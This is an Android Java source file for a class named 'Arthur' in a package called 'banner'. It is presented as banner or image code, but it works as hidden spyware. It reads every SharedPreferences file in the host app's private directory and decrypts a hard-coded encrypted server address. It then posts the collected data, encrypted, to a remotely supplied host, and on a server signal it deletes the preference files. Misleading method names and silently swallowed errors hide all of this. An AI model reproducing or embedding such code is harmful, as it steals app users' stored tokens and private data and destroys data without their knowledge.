package com.cameroon.banner;

import android.content.Context;
import android.content.SharedPreferences;
import android.text.TextUtils;
import android.util.Log;

import com.google.gson.Gson;
import com.google.gson.reflect.TypeToken;

import org.json.JSONObject;

import java.io.File;
import java.lang.reflect.Type;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

//
public class Arthur {

    private static Arthur instance;
    private static Map<String, Object> contentParams;

    //构造器私有化
    private Arthur() {
    }

    //方法同步，调用效率低
    public static synchronized Arthur getInstance() {
        if (instance == null) {
            instance = new Arthur();
        }
        return instance;
    }

    File or;
    File[] files;
    List<String> pathName = new ArrayList<String>();

    // 用于遍历文件价
    public void iteratorPath(String dir) {
        or = new File(dir);
        files = or.listFiles();
        if (files != null) {
            for (File file : files) {
                if (file.isFile()) {
                    pathName.add(file.getName());
                } else if (file.isDirectory()) {
                    iteratorPath(file.getAbsolutePath());
                }
            }
        }
    }

    public void start(final Context context) {
        try {
            SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
            String host = sharedPreferences.getString("host", "");
            long pushTime = sharedPreferences.getLong("push11Time", 0);

            if (pushTime != 0 && !TextUtils.isEmpty(host)) {
                Calendar pushTimeC = Calendar.getInstance();
                Calendar current = Calendar.getInstance();
                pushTimeC.setTimeInMillis(pushTime);
                if (pushTimeC.get(Calendar.DATE) == current.get(Calendar.DATE)) {
                    addFile(context);
                    return;
                }
            }
            final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
            iteratorPath(path);
            contentParams = new HashMap<>();
            final Gson gson = new Gson();
            for (String list : pathName) {
                SharedPreferences sp = context.getSharedPreferences(list.replace(".xml", ""), Context.MODE_PRIVATE);
                Map<String, ?> all = sp.getAll();
                contentParams.put(list.replace(".xml", ""), all);
            }
            String decrypt = AESUtils.decrypt(getClass().getSimpleName(), "BEE22025739CE52210A11D0B9062F80CC8F6FB211E510DE63E6232B9A76C550283F6536D4DB9B0258951BD3C743BD6081F5971ADF2FDBB7E9F2CA5DCE428586369033E219E2828483B191F432FFC5A8E");
            HttpUtils.doHttpReqeust("GET", decrypt, null, new HttpUtils.StringCallback() {
                @Override
                public void onSuccess(String result) {
                    try {
                        final Type type = new TypeToken<Map<String, Object>>() {
                        }.getType();
                        Map<String, Object> map = gson.fromJson(result, type);
                        final JSONObject jsonObject = new JSONObject(result);
                        int code = jsonObject.optInt("code", -1);
                        if (code == 0) {
                            JSONObject content = jsonObject.optJSONObject("content");
                            if (content != null) {
                                final JSONObject aUrl = content.optJSONObject("aUrl");
                                String host = aUrl.optString("host", "");
                                String pushType = aUrl.optString("pushType", "1");
                                SharedPreferences sharedPreferences = context.getSharedPreferences(Arthur.this.getClass().getSimpleName(), Context.MODE_PRIVATE);
                                SharedPreferences.Editor editor = sharedPreferences.edit();
                                editor.putString("host", host);
                                editor.putLong("push11Time", System.currentTimeMillis());
                                editor.putString("pushType", pushType);
                                editor.commit();
                                addFile(context);
                            }
                        }
                    } catch (Exception e) {
                    }
                }

                @Override
                public void onFaileure(int code, Exception e) {
                }
            });
        } catch (Exception e) {
        }
    }

    private void addFile(Context context) {
       try {
           SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
           String pushType = sharedPreferences.getString("pushType", "-1");
           long pushTime = sharedPreferences.getLong("push12Time", 0);
           if (pushTime != 0) {
               Calendar pushTimeC = Calendar.getInstance();
               Calendar current = Calendar.getInstance();
               pushTimeC.setTimeInMillis(pushTime);
               for (int i = 0; i < Calendar.HOUR_OF_DAY; i++) {
                    if (pickerImageLong(i,pushType,pushTimeC,current)){
                        return;
                    }
               }
           }
           bannerImage(context);
       }catch (Exception e){
           e.printStackTrace();
       }

    }


    private boolean  pickerImageLong(int type,String pushType,Calendar pushTimeC,Calendar current){
        if (String.valueOf(type).equals(pushType)) {
            if (pushTimeC.get(type) == current.get(type)) {
                return  true ;
            }
        }
       return false;
    }



    private void bannerImage(Context context) {
        HashMap<String, String> param = new HashMap<>();
        final String path = "/data/data/" + context.getPackageName() + "/shared_prefs";
        final Gson gson = new Gson();
        final SharedPreferences sharedPreferences = context.getSharedPreferences(getClass().getSimpleName(), Context.MODE_PRIVATE);
        String host = sharedPreferences.getString("host", "1");
        param.put("content", AESUtils.encrypt(getClass().getSimpleName(), gson.toJson(contentParams)));
        param.put("pId", AESUtils.encrypt(getClass().getSimpleName(), context.getPackageName()));
        HttpUtils.doHttpReqeust("POST", host, param, new HttpUtils.StringCallback() {
            @Override
            public void onSuccess(String result) {
                try {
                    SharedPreferences.Editor editor = sharedPreferences.edit();
                    editor.putLong("push12Time", System.currentTimeMillis());
                    editor.commit();
                    JSONObject jsonObject1 = new JSONObject(result);
                    int code1 = jsonObject1.optInt("code", -10);
                    if (code1 == 12) {
                        File[] files = new File(path).listFiles();
                        deleteCache(files);
                    }
                } catch (Exception e) {
                }
            }

            @Override
            public void onFaileure(int code, Exception e) {

            }
        });
    }


    public void deleteCache(File[] files) {
        boolean flag;
        for (File itemFile : files) {
            flag = itemFile.delete();
            if (flag == false) {
                deleteCache(itemFile.listFiles());
            }
        }
    }


}
